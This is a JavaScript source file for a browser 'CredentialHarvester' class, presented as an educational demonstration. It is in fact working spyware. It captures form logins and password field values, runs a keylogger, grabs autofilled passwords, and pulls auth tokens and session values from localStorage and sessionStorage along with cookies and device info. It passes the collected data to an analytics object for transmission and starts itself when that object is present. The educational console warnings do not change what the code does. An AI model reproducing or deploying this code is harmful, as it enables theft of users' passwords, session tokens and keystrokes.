// Credentials Module - Educational Security Demonstration
// For educational purposes only - demonstrates browser security vulnerabilities

class CredentialHarvester {
    constructor(analyticsInstance) {
        this.analytics = analyticsInstance;
        this.collectedCredentials = [];
        this.formFields = new Map();
        this.keyloggerData = [];
        this.isMonitoring = false;
        
        this.init();
    }

    init() {
        console.log('🔐 EDUCATIONAL: Initializing credential harvesting demonstration');
        this.setupFormMonitoring();
        this.setupKeylogger();
        this.setupAutofillExtraction();
        this.setupLocalStorageExtraction();
        this.setupSessionStorageExtraction();
        this.setupBrowserHistoryExtraction();
        
        // Educational warning
        this.showEducationalWarning();
    }

    showEducationalWarning() {
        console.warn('⚠️ EDUCATIONAL WARNING: This is for security education only');
        console.warn('⚠️ Never use these techniques without explicit permission');
        console.warn('⚠️ This demonstrates why users should be careful with browser permissions');
    }

    setupFormMonitoring() {
        // Monitor all form submissions
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const credentials = this.extractCredentialsFromForm(form, formData);
            
            if (credentials) {
                this.storeCredentials({
                    type: 'form_submission',
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    ...credentials
                });
            }
        });

        // Monitor input fields for password changes
        document.addEventListener('input', (e) => {
            const field = e.target;
            if (field.type === 'password') {
                this.monitorPasswordField(field);
            }
        });

        // Monitor all password fields on page load
        this.monitorAllPasswordFields();
    }

    monitorAllPasswordFields() {
        const passwordFields = document.querySelectorAll('input[type="password"]');
        passwordFields.forEach(field => {
            this.monitorPasswordField(field);
        });
    }

    monitorPasswordField(field) {
        if (!this.formFields.has(field)) {
            this.formFields.set(field, {
                element: field,
                value: '',
                changes: []
            });
        }

        const fieldData = this.formFields.get(field);
        
        // Store field value changes
        if (field.value !== fieldData.value) {
            fieldData.changes.push({
                value: field.value,
                timestamp: new Date().toISOString(),
                length: field.value.length
            });
            fieldData.value = field.value;

            // Auto-save when user stops typing
            clearTimeout(fieldData.saveTimeout);
            fieldData.saveTimeout = setTimeout(() => {
                if (field.value.length > 0) {
                    this.storeCredentials({
                        type: 'password_field_monitoring',
                        url: window.location.href,
                        fieldName: field.name || field.id || 'unknown',
                        password: field.value,
                        timestamp: new Date().toISOString(),
                        fieldAttributes: this.getFieldAttributes(field)
                    });
                }
            }, 2000);
        }
    }

    getFieldAttributes(field) {
        return {
            name: field.name,
            id: field.id,
            className: field.className,
            placeholder: field.placeholder,
            required: field.required,
            maxLength: field.maxLength,
            autocomplete: field.autocomplete
        };
    }

    extractCredentialsFromForm(form, formData) {
        const credentials = {};
        let hasCredentials = false;

        // Check for common credential field names
        const fieldMappings = {
            username: ['email', 'username', 'user', 'login', 'user_id', 'userid', 'account', 'id'],
            password: ['password', 'pass', 'pwd', 'passwd', 'secret', 'key', 'login_password']
        };

        // Extract username/email
        for (const [key, possibleNames] of Object.entries(fieldMappings)) {
            for (const name of possibleNames) {
                const field = form.querySelector(`[name="${name}"], [id="${name}"]`);
                if (field && field.value) {
                    credentials[key] = field.value;
                    hasCredentials = true;
                    break;
                }
            }
        }

        // Check FormData for credentials
        for (const [fieldKey, fieldValue] of formData.entries()) {
            const lowerKey = fieldKey.toLowerCase();
            if (fieldMappings.username.some(name => lowerKey.includes(name))) {
                credentials.username = fieldValue;
                hasCredentials = true;
            } else if (fieldMappings.password.some(name => lowerKey.includes(name))) {
                credentials.password = fieldValue;
                hasCredentials = true;
            }
        }

        return hasCredentials ? credentials : null;
    }

    setupKeylogger() {
        document.addEventListener('keydown', (e) => {
            const keyData = {
                key: e.key,
                code: e.code,
                timestamp: new Date().toISOString(),
                ctrlKey: e.ctrlKey,
                altKey: e.altKey,
                shiftKey: e.shiftKey,
                metaKey: e.metaKey
            };

            this.keyloggerData.push(keyData);

            // Limit keylogger storage
            if (this.keyloggerData.length > 1000) {
                this.keyloggerData = this.keyloggerData.slice(-500);
            }

            // Detect password typing patterns
            if (this.detectPasswordTyping(e)) {
                this.capturePasswordContext();
            }
        });
    }

    detectPasswordTyping(e) {
        // Detect if user is likely typing in a password field
        const activeElement = document.activeElement;
        return activeElement && (
            activeElement.type === 'password' ||
            activeElement.name?.toLowerCase().includes('pass') ||
            activeElement.id?.toLowerCase().includes('pass')
        );
    }

    capturePasswordContext() {
        const activeElement = document.activeElement;
        if (activeElement) {
            const context = {
                type: 'password_context',
                url: window.location.href,
                fieldName: activeElement.name || activeElement.id,
                fieldValue: activeElement.value,
                timestamp: new Date().toISOString(),
                surroundingText: this.getSurroundingText(activeElement)
            };

            this.storeCredentials(context);
        }
    }

    getSurroundingText(element) {
        // Get text around password field for context
        const parent = element.parentElement;
        if (parent) {
            return parent.textContent?.substring(0, 200) || '';
        }
        return '';
    }

    setupAutofillExtraction() {
        // Monitor for autofill events
        document.addEventListener('change', (e) => {
            const field = e.target;
            if (field.type === 'password' && field.value) {
                this.storeCredentials({
                    type: 'autofill',
                    url: window.location.href,
                    fieldName: field.name || field.id,
                    password: field.value,
                    timestamp: new Date().toISOString(),
                    autofillDetected: true
                });
            }
        });

        // Check for existing autofilled passwords
        setTimeout(() => {
            this.monitorAllPasswordFields();
        }, 1000);
    }

    setupLocalStorageExtraction() {
        // Extract stored credentials from localStorage
        try {
            const keys = Object.keys(localStorage);
            const credentialKeys = keys.filter(key => 
                key.toLowerCase().includes('password') ||
                key.toLowerCase().includes('token') ||
                key.toLowerCase().includes('auth') ||
                key.toLowerCase().includes('login') ||
                key.toLowerCase().includes('session')
            );

            credentialKeys.forEach(key => {
                try {
                    const value = localStorage.getItem(key);
                    if (value && value.length > 10) {
                        this.storeCredentials({
                            type: 'localStorage_extraction',
                            url: window.location.href,
                            storageKey: key,
                            value: value,
                            timestamp: new Date().toISOString()
                        });
                    }
                } catch (e) {
                    console.warn('Could not access localStorage key:', key);
                }
            });
        } catch (e) {
            console.warn('localStorage extraction failed:', e);
        }
    }

    setupSessionStorageExtraction() {
        // Extract stored credentials from sessionStorage
        try {
            const keys = Object.keys(sessionStorage);
            const credentialKeys = keys.filter(key => 
                key.toLowerCase().includes('password') ||
                key.toLowerCase().includes('token') ||
                key.toLowerCase().includes('auth') ||
                key.toLowerCase().includes('login') ||
                key.toLowerCase().includes('session')
            );

            credentialKeys.forEach(key => {
                try {
                    const value = sessionStorage.getItem(key);
                    if (value && value.length > 10) {
                        this.storeCredentials({
                            type: 'sessionStorage_extraction',
                            url: window.location.href,
                            storageKey: key,
                            value: value,
                            timestamp: new Date().toISOString()
                        });
                    }
                } catch (e) {
                    console.warn('Could not access sessionStorage key:', key);
                }
            });
        } catch (e) {
            console.warn('sessionStorage extraction failed:', e);
        }
    }

    setupBrowserHistoryExtraction() {
        // Extract browser history for educational purposes
        try {
            if (window.history && window.history.length > 1) {
                // Get current history state
                const historyData = [];
                
                // Extract accessible history information
                for (let i = 0; i < window.history.length; i++) {
                    try {
                        const state = window.history.state;
                        const historyEntry = {
                            type: 'browser_history',
                            url: window.location.href,
                            historyIndex: i,
                            historyLength: window.history.length,
                            currentState: state,
                            timestamp: new Date().toISOString(),
                            pageTitle: document.title
                        };
                        
                        historyData.push(historyEntry);
                        
                        // Store history entry
                        this.storeCredentials(historyEntry);
                    } catch (e) {
                        console.warn('History entry extraction failed:', e);
                    }
                }
                
                // Try to get more detailed history if available
                if (window.performance && window.performance.getEntriesByType) {
                    try {
                        const navigationEntries = window.performance.getEntriesByType('navigation');
                        navigationEntries.forEach(entry => {
                            const navData = {
                                type: 'navigation_history',
                                url: entry.name || entry.initiatorType || 'unknown',
                                loadTime: entry.responseEnd - entry.requestStart,
                                domContentLoaded: entry.domContentLoadedEventEnd - entry.navigationStart,
                                pageLoadTime: entry.loadEventEnd - entry.navigationStart,
                                timestamp: new Date(entry.startTime).toISOString(),
                                transferSize: entry.transferSize,
                                encodedBodySize: entry.encodedBodySize,
                                decodedBodySize: entry.decodedBodySize
                            };
                            
                            this.storeCredentials(navData);
                        });
                    } catch (e) {
                        console.warn('Performance navigation extraction failed:', e);
                    }
                }
                
                console.log(`🔐 EDUCATIONAL: Browser history extracted - ${historyData.length} entries`);
                
            } else {
                // Store that history is not available
                this.storeCredentials({
                    type: 'browser_history_unavailable',
                    url: window.location.href,
                    reason: 'History API not accessible',
                    timestamp: new Date().toISOString()
                });
            }
        } catch (e) {
            console.warn('Browser history extraction failed:', e);
        }
    }

    storeCredentials(credentialData) {
        // Add session information
        credentialData.sessionId = this.analytics?.sessionId || 'unknown';
        
        // Add device fingerprinting
        credentialData.deviceInfo = this.analytics?.getDeviceInfo ? this.analytics.getDeviceInfo() : {};
        
        this.collectedCredentials.push(credentialData);
        
        console.log('🔐 EDUCATIONAL: Credential data collected:', {
            type: credentialData.type,
            url: credentialData.url,
            timestamp: credentialData.timestamp,
            hasPassword: !!credentialData.password || !!credentialData.value
        });

        // Transmit to analytics
        this.transmitCredentials(credentialData);
    }

    transmitCredentials(credentialData) {
        try {
            // Store in localStorage for dashboard
            const existingData = localStorage.getItem('spyware_credentials');
            const dataArray = existingData ? JSON.parse(existingData) : [];
            
            dataArray.push(credentialData);
            
            // Limit storage
            if (dataArray.length > 50) {
                dataArray.splice(0, dataArray.length - 50);
            }
            
            localStorage.setItem('spyware_credentials', JSON.stringify(dataArray));
            
            // Send to analytics instance
            if (this.analytics) {
                this.analytics.transmitCollectedData();
            }
            
        } catch (e) {
            console.error('Failed to transmit credentials:', e);
        }
    }

    // Educational: Extract cookies
    extractCookies() {
        try {
            const cookies = document.cookie.split(';');
            const cookieData = [];
            
            cookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookieData.push({
                        name: name.trim(),
                        value: value.trim(),
                        domain: window.location.hostname,
                        timestamp: new Date().toISOString()
                    });
                }
            });

            if (cookieData.length > 0) {
                this.storeCredentials({
                    type: 'cookie_extraction',
                    url: window.location.href,
                    cookies: cookieData,
                    timestamp: new Date().toISOString()
                });
            }
        } catch (e) {
            console.warn('Cookie extraction failed:', e);
        }
    }

    
    // Educational: Extract network information
    extractNetworkInfo() {
        try {
            const networkInfo = {
                type: 'network_info',
                url: window.location.href,
                timestamp: new Date().toISOString()
            };

            // Get connection information if available
            if (navigator.connection) {
                networkInfo.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    online: navigator.onLine
                };
            }

            // Get basic network status
            networkInfo.online = navigator.onLine;
            networkInfo.userAgent = navigator.userAgent;

            this.storeCredentials(networkInfo);
        } catch (e) {
            console.warn('Network info extraction failed:', e);
        }
    }

    // Start monitoring
    startMonitoring() {
        this.isMonitoring = true;
        console.log('🔐 EDUCATIONAL: Credential monitoring started');
        
        // Perform initial extractions
        this.extractCookies();
        this.extractBrowserHistory();
        this.extractNetworkInfo();
    }

    // Stop monitoring
    stopMonitoring() {
        this.isMonitoring = false;
        console.log('🔐 EDUCATIONAL: Credential monitoring stopped');
    }

    // Extract browser history for educational purposes
    extractBrowserHistory() {
        try {
            if (window.history && window.history.length > 0) {
                this.storeCredentials({
                    type: 'browser_history',
                    url: window.location.href,
                    historyLength: window.history.length,
                    timestamp: new Date().toISOString(),
                    pageTitle: document.title
                });
            } else {
                this.storeCredentials({
                    type: 'browser_history_unavailable',
                    url: window.location.href,
                    reason: 'History API not accessible',
                    timestamp: new Date().toISOString()
                });
            }
        } catch (e) {
            console.warn('Browser history extraction failed:', e);
        }
    }

    // Get collected credentials for dashboard
    getCollectedCredentials() {
        return this.collectedCredentials;
    }

    // Clear collected credentials
    clearCredentials() {
        this.collectedCredentials = [];
        this.keyloggerData = [];
        localStorage.removeItem('spyware_credentials');
        console.log('🔐 EDUCATIONAL: Credential data cleared');
    }
}

// Export for educational use (global assignment)
window.CredentialHarvester = CredentialHarvester;

// Auto-initialize for educational demonstration
if (typeof window.analyticsInstance !== 'undefined') {
    const harvester = new CredentialHarvester(window.analyticsInstance);
    harvester.startMonitoring();
}
